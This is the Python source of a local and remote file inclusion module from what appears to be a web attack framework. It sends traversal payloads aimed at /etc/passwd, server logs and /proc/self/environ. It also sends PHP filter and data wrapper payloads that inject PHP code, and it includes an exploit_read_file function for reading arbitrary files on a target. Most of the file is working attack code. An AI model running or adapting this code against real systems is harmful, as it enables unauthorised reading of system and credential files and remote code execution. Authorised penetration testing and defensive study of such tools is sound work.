#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - LFI/RFI Module
Local/Remote File Inclusion detection and exploitation
"""

import os
import sys
import re
import base64

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Payloads, Colors


class LFIModule:
    """LFI/RFI Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "LFI/RFI"
        
        # File content indicators
        self.file_indicators = {
            '/etc/passwd': [
                'root:x:',
                'bin:x:',
                'daemon:x:',
                '/bin/bash',
                '/bin/sh',
            ],
            'win.ini': [
                'for 16-bit app support',
                '[extensions]',
                '[fonts]',
                '[mci extensions]',
            ],
            'phpinfo': [
                'phpinfo()',
                'PHP Version',
                'System',
                'Build Date',
            ],
            'access.log': [
                'GET /',
                'POST /',
                'HTTP/1.1',
                'Mozilla/',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for LFI/RFI"""
        # Test LFI
        self._test_lfi(url, method, param, value)
        
        # Test RFI
        self._test_rfi(url, method, param, value)
        
        # Test log poisoning
        self._test_log_poisoning(url, method, param, value)
        
        # Test PHP wrappers
        self._test_php_wrappers(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for LFI"""
        pass
    
    def _test_lfi(self, url: str, method: str, param: str, value: str):
        """Test for Local File Inclusion"""
        payloads = Payloads.LFI_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text
                
                # Check for file content indicators
                for file_type, indicators in self.file_indicators.items():
                    match_count = 0
                    for indicator in indicators:
                        if indicator in response_text:
                            match_count += 1
                    
                    # Require 3+ indicators for /etc/passwd (more specific),
                    # 2+ for other file types
                    min_matches = 3 if file_type == '/etc/passwd' else 2
                    if match_count >= min_matches:
                        from core.engine import Finding
                        finding = Finding(
                            technique="LFI (Local File Inclusion)",
                            url=url,
                            severity='HIGH',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence=f"File content detected: {file_type}",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'LFI test error: {e}')}")
    
    def _test_rfi(self, url: str, method: str, param: str, value: str):
        """Test for Remote File Inclusion"""
        payloads = Payloads.RFI_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check if remote content was included
                # This is tricky to detect without a callback server
                # We'll look for common indicators
                if response.status_code == 200:
                    # Check for PHP code execution
                    if '<?php' in response.text or '<?=' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="RFI (Remote File Inclusion)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence="Remote file may have been included",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'RFI test error: {e}')}")
    
    def _test_log_poisoning(self, url: str, method: str, param: str, value: str):
        """Test for log file inclusion (log poisoning)"""
        log_paths = [
            '../../../var/log/apache2/access.log',
            '../../../var/log/apache/access.log',
            '../../../var/log/nginx/access.log',
            '../../../var/log/httpd/access.log',
            '../../../proc/self/environ',
            '../../../proc/self/cmdline',
            '../../../var/log/vsftpd.log',
            '../../../var/log/ftp.log',
        ]
        
        for log_path in log_paths:
            try:
                data = {param: log_path}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for log content
                log_indicators = [
                    'GET /',
                    'POST /',
                    'HTTP/1.1',
                    'Mozilla/',
                    'Accept:',
                    'Host:',
                ]
                
                match_count = sum(1 for ind in log_indicators if ind in response.text)
                
                if match_count >= 3:
                    from core.engine import Finding
                    finding = Finding(
                        technique="LFI (Log Poisoning Possible)",
                        url=url,
                        severity='HIGH',
                        confidence=0.8,
                        param=param,
                        payload=log_path,
                        evidence="Log file accessible via LFI",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Log poisoning test error: {e}')}")
    
    def _test_php_wrappers(self, url: str, method: str, param: str, value: str):
        """Test PHP wrappers"""
        wrappers = [
            ('php://filter/read=convert.base64-encode/resource=', 'base64'),
            ('php://input', 'input'),
            ('data://text/plain,', 'data'),
            ('expect://', 'expect'),
        ]
        
        for wrapper, wtype in wrappers:
            try:
                if wtype == 'base64':
                    test_file = 'index.php'
                    payload = f"{wrapper}{test_file}"
                elif wtype == 'data':
                    payload = f"{wrapper}<?php echo 'lfi_test'; ?>"
                else:
                    continue
                
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for successful wrapper usage
                if wtype == 'base64':
                    # Try to decode base64 response
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if '<?php' in decoded or '<?=' in decoded:
                            from core.engine import Finding
                            finding = Finding(
                                technique="LFI (PHP Filter Wrapper)",
                                url=url,
                                severity='HIGH',
                                confidence=0.9,
                                param=param,
                                payload=payload,
                                evidence="PHP file content retrieved via wrapper",
                            )
                            self.engine.add_finding(finding)
                            return
                    except (Exception, ValueError):
                        pass
                elif wtype == 'data':
                    if 'lfi_test' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="LFI (PHP Data Wrapper)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence="PHP code execution via data wrapper",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'PHP wrapper test error: {e}')}")
    
    def exploit_read_file(self, url: str, param: str, file_path: str) -> str:
        """Attempt to read a file via LFI"""
        try:
            data = {param: f"../../../{file_path}"}
            response = self.requester.request(url, 'GET', data=data)
            
            if response:
                return response.text
        except Exception as e:
            print(f"{Colors.error(f'File read error: {e}')}")
        
        return None
